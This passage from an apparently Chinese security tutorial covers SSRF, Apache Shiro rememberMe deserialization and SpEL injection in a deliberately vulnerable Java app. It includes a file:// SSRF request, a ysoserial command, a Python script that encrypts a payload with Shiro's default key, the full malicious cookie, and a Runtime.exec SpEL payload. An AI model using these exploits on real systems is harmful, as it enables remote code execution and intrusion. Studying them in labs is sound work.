src="https://gitee.com/xvshifu/pic-go/raw/master/img/20250726112359849.png" alt="image-20250726112359793"></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/urlConnection/vuln&quot;, method = &#123;RequestMethod.POST, RequestMethod.GET&#125;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">URLConnectionVuln</span><span class="hljs-params">(String url)</span> &#123;<br>    <span class="hljs-keyword">return</span> HttpUtils.URLConnection(url);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">URLConnection</span><span class="hljs-params">(String url)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//没有校验协议和主机，对任意协议都可以访问</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br>        <span class="hljs-type">URLConnection</span> <span class="hljs-variable">urlConnection</span> <span class="hljs-operator">=</span> u.openConnection();<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(urlConnection.getInputStream())); <span class="hljs-comment">//send request</span><br>        String inputLine;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">html</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>        <span class="hljs-keyword">while</span> ((inputLine = in.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>            html.append(inputLine);<br>        &#125;<br>        in.close();<br>        <span class="hljs-keyword">return</span> html.toString();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.getMessage());<br>        <span class="hljs-keyword">return</span> e.getMessage();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/ssrf/urlConnection/vuln</span>?url=file:<span class="hljs-string">/D</span>:<span class="hljs-string">/1.txt</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080941099.png" alt="20250726112949883"></p><h2 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(value = &quot;/shiro/deserialize&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">shiro_deserialize</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse res)</span> &#123;<br>    <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> getCookie(req, Constants.REMEMBER_ME_COOKIE);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == cookie) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No rememberMe cookie. Right?&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">rememberMe</span> <span class="hljs-operator">=</span> cookie.getValue();<br>        <span class="hljs-type">byte</span>[] b64DecodeRememberMe = java.util.Base64.getDecoder().decode(rememberMe);<br>        <span class="hljs-type">byte</span>[] aesDecrypt = acs.decrypt(b64DecodeRememberMe, KEYS).getBytes();<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bytes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(aesDecrypt);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bytes);<br>        in.readObject();<br>        in.close();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>        <span class="hljs-keyword">if</span> (CookieUtils.addCookie(res, <span class="hljs-string">&quot;rememberMe&quot;</span>, DELETE_ME))&#123;<br>            log.error(e.getMessage());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;RememberMe cookie decrypt error. Set deleteMe cookie success.&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Shiro deserialize&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Shiro  <code>rememberMe</code> 功能用于“记住登录状态”。它的设计逻辑是：</p><p>用户勾选“记住我”登录后，Shiro 把用户的认证信息<strong>序列化为字节流</strong>，用一个固定密钥（默认是 <code>kPH+bIxk5D2deZiIxcaaaA==</code>）用 AES 加密，Base64 编码后作为 <code>rememberMe</code> Cookie 发送给浏览器。当浏览器下次请求时，Shiro：读取 <code>rememberMe</code> Cookie，用同样的密钥进行解密，然后<strong>直接反序列化</strong>出用户对象，只要攻击者能控制 <code>rememberMe</code> Cookie 内容，<strong>就能构造恶意对象反序列化，从而执行任意代码。</strong></p><p><strong>漏洞利用：</strong></p><p>生成恶意序列化数据</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial.<span class="hljs-keyword">jar </span>CommonsBeanutils1 <span class="hljs-string">&quot;calc.exe&quot;</span> &gt; payload.<span class="hljs-keyword">bin</span><br></code></pre></td></tr></table></figure><p>加密 Payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># Shiro 默认密钥</span><br>key = base64.b64decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br><br><span class="hljs-comment"># 读取 payload</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;D:\\CTF-Tools\\ysoserial-master\\target\\payload.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    payload = f.read()<br><br><span class="hljs-comment"># 补齐为 16 的倍数 (PKCS5Padding)</span><br>pad = <span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(payload) % <span class="hljs-number">16</span><br>payload += <span class="hljs-built_in">bytes</span>([pad] * pad)<br><br><span class="hljs-comment"># AES-CBC 加密 (IV 随机生成)</span><br>iv = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">16</span>  <span class="hljs-comment"># 实际攻击需随机 IV</span><br>cipher = AES.new(key, AES.MODE_CBC, iv)<br>encrypted = cipher.encrypt(payload)<br><br><span class="hljs-comment"># Base64 编码</span><br>rememberMe = base64.b64encode(iv + encrypted).decode()  <span class="hljs-comment"># Shiro 格式: IV+密文</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;恶意 Cookie:&quot;</span>, rememberMe)<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">恶意 Cookie: <br>AAAAAAAAAAAAAAAAAAAAAJE6IN+YLEO<span class="hljs-regexp">/t7NuQvYGo54pFMPmAy1jLjUdyV2cc+dKJ0aTntr18Yzsis+1QzDVvl+rnlJLeWPJuL0cSfWAzo+2No6vA3hYfiyY7N7bIdaAAkxZxFdOGUyPMfG4Vp2mmHjn+yS1RXTT9F5R0sGFblDzzZz+nZQsajao/g</span>dRfw9LcryTLP6L34t9wsvsXnBU1VSf5hQbAnLNK8U6tmS8mE71BGg5DVxXjdaZ2Sktj6pGhYmrmySrHqvTuDxmZF+EgIA+g0SQMeALpCzmRK4j4Lmn3JQAqEAhglphaTt+<span class="hljs-number">2</span>UB7rzvNBVbUGHx72GSISDEQiCBRjyufA+sziQUFYCP6DjWEjYOtXKTH+AKulse6AvZXu3Tkybnwa8ZPHPDQGT5b<span class="hljs-regexp">/pNB32K+ftJjsycsFSixp29sAnPqWZQ2c8pOTmznkkXlBdQTDTHtPhGTHntexCFgTHGiqALSXXHWSGmhn8WljmLUFsOLSCgEeWFPZt5uWX78goP5ZDwU/</span>ZYGm5QyIgBBYjjYyuv6nYVZKYbH1A22Iy5sKFjbFXY3YyXWV3hLgmI801jgthjOt5G3iKXhUK557xmEXqe9gZamYVPMxKdIRdiU7fQMPH<span class="hljs-regexp">/7sVd8zAorKWwpoCxU9AedfAZbDFN0I3/g</span>cYI0dAbQg9GyC9jMb5OiDIZE6sFd2XTSWbYQrdnePZe5gPjx8zlntQYl+<span class="hljs-number">7</span>imK4pCFGgBIqX+<span class="hljs-number">1</span>G0O0GvRIBoWUadk5KK8lm9J3aXjtfo25hFu6DnnPnDyRQnudEdQLjNqYpiIxJtNw<span class="hljs-regexp">/W0VgEmjpG2OsLRtsCRddr8/</span>Vky+<span class="hljs-number">6</span>t5i76oEqDU8iPh<span class="hljs-regexp">/Stjj9OfjfSNroe3B5Nbzzh1e0KWVoTPoNRc4d3THTBcaNeK3YnyTN3Ws+88WBG7vbFZF9Fj5GdksjEYcmRDnWbukoLJJH0diWwXT7cSKOdKqAsFQr0meXhGWvMAN1EP74/</span>zvbXM<span class="hljs-regexp">/RpZZlefSQpfeh29D2wxaqdP2ydMTo+qixxTIIEspf4EFI3/</span>vO+kPojn<span class="hljs-regexp">/GA+H38ovGW6reqxHXooV655jmV155px5BFR/</span>MvklhgGyiSPVNoPL567alnOsfhd2R2h3<span class="hljs-regexp">/6VZv04uwu4p4dLa13EL9l+PEOXETpbLQEYmln707qD3+mx+lUD8HHusPJfVtI6CZPzceIdq/</span>c347uFpGmvZv0fzulV2NuWKS2N5rsBmuUR<span class="hljs-regexp">/+RZR9Pdu65/</span>KYqX85Fw1knJYNJF3wKT<span class="hljs-regexp">/uI8deF+D0b/</span>Ib0rzkHWI2nFWQ24T+Zl1<span class="hljs-regexp">/DsEleOAe8KQaS6mfcbfHyyilY0tFL3dw2TmcFqToSoFeuJEGsAiRjM+1bp5TqJmfKUcnbDqLK4ybs+IlUh1ESSTFBiE7soFo9vytcu1l1Q4YL3OwbTLci2CpaugEF6ehkJrQ0a2JlTDScqxVGtkkT13p9+b5XShyLT83rSoVbQWfQuaWw0EIfaz295IzGjmo8F46mo2EJIB0HXbSiRusBU7x4xLgpjvZ5G8c7GkQNOfx96gGHYy6k+yoWcSKWWuKq7SVqgI8bKSDrGT25Ko8dPGpTYjQ5YyVw3PA2AU8VqdaUMWINPNMm5Aoi/</span>AgzKBPup2b+<span class="hljs-number">3</span>V618KprP6u029vuQoW9VysdJCsmA3MyCqQFvCGpaK0KbKWo+<span class="hljs-number">8</span>ZGYqH4sPJH4xJe1SlocC+hJpR+o+AHmD1S7cESYzXXQMMThHbcP2XD84AUvHWCE2N4R8CJBWKn6WlXPQDgQPjt7EQIQVZFExgSY8M<span class="hljs-regexp">/D0o9vQYfxibUt+7RgHQ+4QrZvqxkR9YcdXldx+Fvhjwz/</span>fgg<span class="hljs-regexp">/rktKZf6KChS7vLrZSoIOLeO6a1BVVp9TQKHix1wTs5rTiQyNEBL2q1ZpCIoEbEhRFHeynOgtTjzuUrYZkSZQJ7Llrd8MvejJqCZW9ooOP38g5jmK8tZMX1+G5N/</span>o2X0cKdGWLrUx5SArOLo5tf7LnUF716la<span class="hljs-regexp">/EnO/</span>sgvPAq2URt0umwmnldywDMZl0ZQVQwHySRrl+qbJEnSrdQAppjPtHI4lnW9+SrqIqPbcUieH6yWi0HRrQQXgUUSMgEO2LR<span class="hljs-regexp">/p9cbqG+ouAeLL2RVCUyscWdpbT2k1Ffjpxq98yp7iu0SQScOAmB6eLUBJueow1p+Jl1L5xakot4cpS5TNEiyzGVdNTVr/</span>M9SFzyQTARtW4HdKZoVU2VUMIZUScaudUl+Jjvwi<span class="hljs-regexp">/0haRw/</span>emevd<span class="hljs-regexp">/wjsxM0y7EWaLyjn0NjgXiLpGkEh433iyTBF+0U3j87DAYmA2KKWHsr2aXryYCjJHhKCHXCTq3sEn5OwshulkaeVZaxiCkFx0NeLa37v66DnyctyjVTTIV9nMhKLC62UVFzwkppxwt2RQAgo/</span>YvJHZrhV4SPFgZQMt07yvTCGOhRsWYev+IwidIHrcefeYPDuWTXsO9LAZu9dUTu7R5pM7u7oKbBPpXYuqiCVOm5HQOUPbS<span class="hljs-regexp">/kmBxGFZcEQhP+hI0SliS7+D0Az3YfLHX59AFfRwAN/</span>R1RXkscsUxZ5FT43IcXEFoEsC1rIK46TJWiZErGsPGLphxXsLVrAu<span class="hljs-regexp">/1IlrSbwLp/</span>lUFtJLzmN9LemI2WM1mhn6SiO1QNWX79hSHZjAZTytzSpRXewdcPCmztKIyFZEYLPQlzZ5opck7Vb+<span class="hljs-number">3</span>sxqRYjWucGEnVn8zKdUG<span class="hljs-regexp">/6XG3n1PXReOaXu8ZcK+XcdK57tAwiW2i/</span><span class="hljs-number">4</span>ewrWv6wK3vIZ1S7SecN8Ff7Kg<span class="hljs-regexp">/mNVnAKFNVU/</span><span class="hljs-number">4</span>YgI0hi1tgoou2k89ieMdayFpxQPrsTQHf8TTSsVKzGnU125XYarMHAosNLm9H6dkt09i5Qg72HT<span class="hljs-regexp">/wKq7vkZGOLQ4U9egq3FRsxDL9sq1BayxIqPAVcfjfQ7Ft+e4nYJ0GKANDc8Hv/</span><span class="hljs-number">4</span>ij9qIjJ2rD6f0GUuU0rBS8xFVLenvKPUjneFgDcCtJ2ZmdZJGbH8Wget9lkEYp4ioMR7GSYIJ21bNAX<span class="hljs-regexp">/3imJ21yF2Qt74Gamc1972lYhOEtVWQeYwsW5AsDYIr9hVNysJvlXS6Wq2ear/</span>vv0wALrp8De4IIuAhTxVUj4B2a8i7TcY1wl2UmPMfjnzEpKIQZAeJ96ESqYQSCNhH11NNdL6+Zg9kGqy2Q<span class="hljs-regexp">/bW/</span><span class="hljs-number">1</span>nlTjg+dVs7bd8hq7ZEWo9qFNpCUg9ulN27sZA+nP6tlQYLioDJQtv0uos7EHkLrY63BAwE3yabrxn3RkLnk8arqkedmOag46+vydoiyqzDvka5HuZN7ntLTcggMo4lfG0MhTQji21qbky7zEZxeWty55t<span class="hljs-regexp">/UhCCLVQQsBQcu4v3M6eNe9maR985c1Nw7opVGKb9p1MAm7OCOq4Hkl4rwyWjroSXEaJpjQCdAiikTrMsIj2YDr5kIN79WEITTbBB6iMEimvXpqcy1nqqnNN3D4yKlf2zmwKpyvDYCoz71RCO+1P9O8Js3RftXHrHew2X/</span>Y<span class="hljs-regexp">/2sGrn8YuxthTUBLhA7aF6+jMzVzBhmRygBcrx5E3zkOPIyDwP9jheD9ghHEBvCJE5Se3kXmcY0dsOVZWp1yCSQShAZL0dfCCCcLzG1V/y</span>dV1Y3q8Jt5Q2KslxZkyF5gR94O3<span class="hljs-regexp">/46aqAXSCxyoxT3Sh/</span>SFZ+wEOcI<span class="hljs-regexp">/XOqGrg9J82FnTBCvVOOvtV3mF0KC/</span>p3TD8ARmpy1xE+<span class="hljs-number">1</span>kt9C+CjYL+QAS<span class="hljs-regexp">/G/</span>AppCDhNKAhH6K4gOnSv7XkvbGmw0L5lXj0jxLItOL13xZ6zU0dcDR8LwybZnZadALqTLpFHaBdDEms2QtRn8sIiXvvWqPZvKdbgw3MRcVtA==<br></code></pre></td></tr></table></figure><p>发送 cookie 请求</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">Cookie: <br>rememberMe=AAAAAAAAAAAAAAAAAAAAAJE6IN+YLEO<span class="hljs-regexp">/t7NuQvYGo54pFMPmAy1jLjUdyV2cc+dKJ0aTntr18Yzsis+1QzDVvl+rnlJLeWPJuL0cSfWAzo+2No6vA3hYfiyY7N7bIdaAAkxZxFdOGUyPMfG4Vp2mmHjn+yS1RXTT9F5R0sGFblDzzZz+nZQsajao/g</span>dRfw9LcryTLP6L34t9wsvsXnBU1VSf5hQbAnLNK8U6tmS8mE71BGg5DVxXjdaZ2Sktj6pGhYmrmySrHqvTuDxmZF+EgIA+g0SQMeALpCzmRK4j4Lmn3JQAqEAhglphaTt+<span class="hljs-number">2</span>UB7rzvNBVbUGHx72GSISDEQiCBRjyufA+sziQUFYCP6DjWEjYOtXKTH+AKulse6AvZXu3Tkybnwa8ZPHPDQGT5b<span class="hljs-regexp">/pNB32K+ftJjsycsFSixp29sAnPqWZQ2c8pOTmznkkXlBdQTDTHtPhGTHntexCFgTHGiqALSXXHWSGmhn8WljmLUFsOLSCgEeWFPZt5uWX78goP5ZDwU/</span>ZYGm5QyIgBBYjjYyuv6nYVZKYbH1A22Iy5sKFjbFXY3YyXWV3hLgmI801jgthjOt5G3iKXhUK557xmEXqe9gZamYVPMxKdIRdiU7fQMPH<span class="hljs-regexp">/7sVd8zAorKWwpoCxU9AedfAZbDFN0I3/g</span>cYI0dAbQg9GyC9jMb5OiDIZE6sFd2XTSWbYQrdnePZe5gPjx8zlntQYl+<span class="hljs-number">7</span>imK4pCFGgBIqX+<span class="hljs-number">1</span>G0O0GvRIBoWUadk5KK8lm9J3aXjtfo25hFu6DnnPnDyRQnudEdQLjNqYpiIxJtNw<span class="hljs-regexp">/W0VgEmjpG2OsLRtsCRddr8/</span>Vky+<span class="hljs-number">6</span>t5i76oEqDU8iPh<span class="hljs-regexp">/Stjj9OfjfSNroe3B5Nbzzh1e0KWVoTPoNRc4d3THTBcaNeK3YnyTN3Ws+88WBG7vbFZF9Fj5GdksjEYcmRDnWbukoLJJH0diWwXT7cSKOdKqAsFQr0meXhGWvMAN1EP74/</span>zvbXM<span class="hljs-regexp">/RpZZlefSQpfeh29D2wxaqdP2ydMTo+qixxTIIEspf4EFI3/</span>vO+kPojn<span class="hljs-regexp">/GA+H38ovGW6reqxHXooV655jmV155px5BFR/</span>MvklhgGyiSPVNoPL567alnOsfhd2R2h3<span class="hljs-regexp">/6VZv04uwu4p4dLa13EL9l+PEOXETpbLQEYmln707qD3+mx+lUD8HHusPJfVtI6CZPzceIdq/</span>c347uFpGmvZv0fzulV2NuWKS2N5rsBmuUR<span class="hljs-regexp">/+RZR9Pdu65/</span>KYqX85Fw1knJYNJF3wKT<span class="hljs-regexp">/uI8deF+D0b/</span>Ib0rzkHWI2nFWQ24T+Zl1<span class="hljs-regexp">/DsEleOAe8KQaS6mfcbfHyyilY0tFL3dw2TmcFqToSoFeuJEGsAiRjM+1bp5TqJmfKUcnbDqLK4ybs+IlUh1ESSTFBiE7soFo9vytcu1l1Q4YL3OwbTLci2CpaugEF6ehkJrQ0a2JlTDScqxVGtkkT13p9+b5XShyLT83rSoVbQWfQuaWw0EIfaz295IzGjmo8F46mo2EJIB0HXbSiRusBU7x4xLgpjvZ5G8c7GkQNOfx96gGHYy6k+yoWcSKWWuKq7SVqgI8bKSDrGT25Ko8dPGpTYjQ5YyVw3PA2AU8VqdaUMWINPNMm5Aoi/</span>AgzKBPup2b+<span class="hljs-number">3</span>V618KprP6u029vuQoW9VysdJCsmA3MyCqQFvCGpaK0KbKWo+<span class="hljs-number">8</span>ZGYqH4sPJH4xJe1SlocC+hJpR+o+AHmD1S7cESYzXXQMMThHbcP2XD84AUvHWCE2N4R8CJBWKn6WlXPQDgQPjt7EQIQVZFExgSY8M<span class="hljs-regexp">/D0o9vQYfxibUt+7RgHQ+4QrZvqxkR9YcdXldx+Fvhjwz/</span>fgg<span class="hljs-regexp">/rktKZf6KChS7vLrZSoIOLeO6a1BVVp9TQKHix1wTs5rTiQyNEBL2q1ZpCIoEbEhRFHeynOgtTjzuUrYZkSZQJ7Llrd8MvejJqCZW9ooOP38g5jmK8tZMX1+G5N/</span>o2X0cKdGWLrUx5SArOLo5tf7LnUF716la<span class="hljs-regexp">/EnO/</span>sgvPAq2URt0umwmnldywDMZl0ZQVQwHySRrl+qbJEnSrdQAppjPtHI4lnW9+SrqIqPbcUieH6yWi0HRrQQXgUUSMgEO2LR<span class="hljs-regexp">/p9cbqG+ouAeLL2RVCUyscWdpbT2k1Ffjpxq98yp7iu0SQScOAmB6eLUBJueow1p+Jl1L5xakot4cpS5TNEiyzGVdNTVr/</span>M9SFzyQTARtW4HdKZoVU2VUMIZUScaudUl+Jjvwi<span class="hljs-regexp">/0haRw/</span>emevd<span class="hljs-regexp">/wjsxM0y7EWaLyjn0NjgXiLpGkEh433iyTBF+0U3j87DAYmA2KKWHsr2aXryYCjJHhKCHXCTq3sEn5OwshulkaeVZaxiCkFx0NeLa37v66DnyctyjVTTIV9nMhKLC62UVFzwkppxwt2RQAgo/</span>YvJHZrhV4SPFgZQMt07yvTCGOhRsWYev+IwidIHrcefeYPDuWTXsO9LAZu9dUTu7R5pM7u7oKbBPpXYuqiCVOm5HQOUPbS<span class="hljs-regexp">/kmBxGFZcEQhP+hI0SliS7+D0Az3YfLHX59AFfRwAN/</span>R1RXkscsUxZ5FT43IcXEFoEsC1rIK46TJWiZErGsPGLphxXsLVrAu<span class="hljs-regexp">/1IlrSbwLp/</span>lUFtJLzmN9LemI2WM1mhn6SiO1QNWX79hSHZjAZTytzSpRXewdcPCmztKIyFZEYLPQlzZ5opck7Vb+<span class="hljs-number">3</span>sxqRYjWucGEnVn8zKdUG<span class="hljs-regexp">/6XG3n1PXReOaXu8ZcK+XcdK57tAwiW2i/</span><span class="hljs-number">4</span>ewrWv6wK3vIZ1S7SecN8Ff7Kg<span class="hljs-regexp">/mNVnAKFNVU/</span><span class="hljs-number">4</span>YgI0hi1tgoou2k89ieMdayFpxQPrsTQHf8TTSsVKzGnU125XYarMHAosNLm9H6dkt09i5Qg72HT<span class="hljs-regexp">/wKq7vkZGOLQ4U9egq3FRsxDL9sq1BayxIqPAVcfjfQ7Ft+e4nYJ0GKANDc8Hv/</span><span class="hljs-number">4</span>ij9qIjJ2rD6f0GUuU0rBS8xFVLenvKPUjneFgDcCtJ2ZmdZJGbH8Wget9lkEYp4ioMR7GSYIJ21bNAX<span class="hljs-regexp">/3imJ21yF2Qt74Gamc1972lYhOEtVWQeYwsW5AsDYIr9hVNysJvlXS6Wq2ear/</span>vv0wALrp8De4IIuAhTxVUj4B2a8i7TcY1wl2UmPMfjnzEpKIQZAeJ96ESqYQSCNhH11NNdL6+Zg9kGqy2Q<span class="hljs-regexp">/bW/</span><span class="hljs-number">1</span>nlTjg+dVs7bd8hq7ZEWo9qFNpCUg9ulN27sZA+nP6tlQYLioDJQtv0uos7EHkLrY63BAwE3yabrxn3RkLnk8arqkedmOag46+vydoiyqzDvka5HuZN7ntLTcggMo4lfG0MhTQji21qbky7zEZxeWty55t<span class="hljs-regexp">/UhCCLVQQsBQcu4v3M6eNe9maR985c1Nw7opVGKb9p1MAm7OCOq4Hkl4rwyWjroSXEaJpjQCdAiikTrMsIj2YDr5kIN79WEITTbBB6iMEimvXpqcy1nqqnNN3D4yKlf2zmwKpyvDYCoz71RCO+1P9O8Js3RftXHrHew2X/</span>Y<span class="hljs-regexp">/2sGrn8YuxthTUBLhA7aF6+jMzVzBhmRygBcrx5E3zkOPIyDwP9jheD9ghHEBvCJE5Se3kXmcY0dsOVZWp1yCSQShAZL0dfCCCcLzG1V/y</span>dV1Y3q8Jt5Q2KslxZkyF5gR94O3<span class="hljs-regexp">/46aqAXSCxyoxT3Sh/</span>SFZ+wEOcI<span class="hljs-regexp">/XOqGrg9J82FnTBCvVOOvtV3mF0KC/</span>p3TD8ARmpy1xE+<span class="hljs-number">1</span>kt9C+CjYL+QAS<span class="hljs-regexp">/G/</span>AppCDhNKAhH6K4gOnSv7XkvbGmw0L5lXj0jxLItOL13xZ6zU0dcDR8LwybZnZadALqTLpFHaBdDEms2QtRn8sIiXvvWqPZvKdbgw3MRcVtA==<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942029.png" alt="20250726132755476"></p><p>也可以利用工具：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942947.png" alt="20250726133031514"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942394.png" alt="20250726133042646"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942506.png" alt="20250726133057346"></p><h2 id="SpEL"><a href="#SpEL" class="headerlink" title="SpEL"></a>SpEL</h2><blockquote><p>Spring Expression Language 是一种表达式语言，支持运行时查询和操作对象图，同时也有方法调用和字符串模板功能</p><p>SpEL使用 <code>#{...}</code> 作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法如：</p><blockquote><p>引用其他对象:<code>#{car}</code><br>引用其他对象的属性：<code>#{car.brand}</code><br>调用其它方法 , 还可以链式操作：<code>#{car.toString()}</code></p></blockquote><p>1.类类型表达式</p><p>使用<code>T()</code>运算符会调用类作用域的静态属性或静态方法，SpEL内置了<code>java.lang</code>包下的类声明，也就是说<code>java.lang.String</code>可以通过<code>T(String)</code>访问，而不需要使用全限定名<br>比如：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">T</span><span class="hljs-params">(Runtime)</span></span><span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(\<span class="hljs-string">&quot;open /Applications/Calculator.app\&quot;)</span><br></code></pre></td></tr></table></figure><p>2.类实例化<br>使用new可以直接在SpEL中创建实例，需要创建实例的类要通过全限定名进行访问。<br>比如</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-keyword">new</span> java.util.<span class="hljs-built_in">Date</span>()<br></code></pre></td></tr></table></figure></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/spel/vuln1&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">spel_vuln1</span><span class="hljs-params">(String value)</span> &#123;<br>    <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>    <span class="hljs-keyword">return</span> parser.parseExpression(value).getValue().toString();<br>&#125;<br><br><br><span class="hljs-meta">@RequestMapping(&quot;spel/vuln2&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">spel_vuln2</span><span class="hljs-params">(String value)</span> &#123;<br>    <span class="hljs-type">StandardEvaluationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br>    <span class="hljs-type">SpelExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>    <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(value, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplateParserContext</span>());<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> 